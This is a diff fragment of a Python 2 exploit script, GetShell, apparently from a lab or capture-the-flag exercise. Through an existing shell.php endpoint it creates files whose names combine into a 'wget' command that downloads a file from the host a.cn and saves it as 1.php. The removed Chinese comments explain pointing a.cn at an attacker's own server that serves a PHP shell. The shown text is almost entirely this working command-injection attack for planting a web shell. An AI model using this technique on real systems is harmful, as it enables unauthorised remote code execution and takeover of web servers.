@@ -46,9 +46,6 @@ import requests
 def GetShell():
     url = "http://192.168.56.129/shell.php?1="
     fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
-    # linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"
-    # 可以修改hosts文件，让a.cn指向一个自己的服务器。
-    # 在a.cn 的根目录下创建index.html ，内容是一个php shell 
     for fileName in fileNames:
         createFileUrl = url+">"+fileName
         print createFileUrl 
